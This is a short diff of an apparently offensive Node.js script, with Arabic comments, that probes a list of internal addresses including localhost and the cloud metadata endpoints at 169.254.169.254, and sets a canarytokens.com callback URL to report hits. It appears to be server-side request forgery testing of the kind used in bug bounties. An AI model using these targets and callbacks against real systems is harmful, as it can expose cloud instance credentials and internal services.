@@ -8,7 +8,6 @@ const PORT = process.env.PORT || 10000;
 // قائمة أهداف داخلية نجربها
 const TARGETS = [
   'http://127.0.0.1:80',
-  'http://canarytokens.com/articles/qczfimih1tdawvj4ijjldi9fp/contact.php',
   'http://localhost:80',
   'http://169.254.169.254/latest/meta-data/',
   'http://169.254.169.254/latest/user-data/',
@@ -17,7 +16,7 @@ const TARGETS = [
 ];
 
 // رابط التبليغ حقك
-const PING_URL = 'https://canarytokens.com/abc123';  // غيّره
+const PING_URL = 'http://canarytokens.com/articles/qczfimih1tdawvj4ijjldi9fp/contact.php';  // غيّره
 
 function tryTargetsSequentially(targets, notify) {
   const tryNext = (index) => {
